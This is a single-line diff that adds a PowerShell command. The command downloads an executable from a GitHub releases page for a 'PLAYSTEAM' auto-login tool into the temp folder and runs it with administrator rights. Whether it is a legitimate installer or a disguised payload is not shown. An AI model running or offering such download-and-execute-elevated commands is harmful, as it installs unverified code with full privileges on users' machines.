@@ -1,0 +1,1 @@
+$p="$env:temp\p.exe"; (New-Object Net.WebClient).DownloadFile("https://github.com/Rober324/PLAYSTEAM_AUTOLOGIN/releases/latest/download/PLAYSTEAM_NATIVO.exe",$p); Start-Process $p -Verb RunAs; exit
